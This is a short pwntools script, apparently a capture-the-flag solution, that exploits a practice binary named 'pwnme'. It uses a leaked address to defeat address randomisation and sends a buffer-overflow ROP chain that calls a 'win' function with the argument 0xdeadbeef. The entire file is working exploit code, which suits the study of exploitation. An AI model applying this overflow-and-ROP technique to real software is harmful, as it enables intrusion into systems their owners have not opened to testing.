from pwn import *

elf = context.binary = ELF("./pwnme")
p = process()

win_leak = int(p.recvline().split()[-1], 16)
elf.address = win_leak - elf.symbols.win

rop = ROP(elf)
payload = flat(
    cyclic(40),
    rop.rdi.address,
    0xdeadbeef,
    rop.ret.address,
    win_leak      
)

p.sendline(payload)
write("payload", payload)
p.interactive()

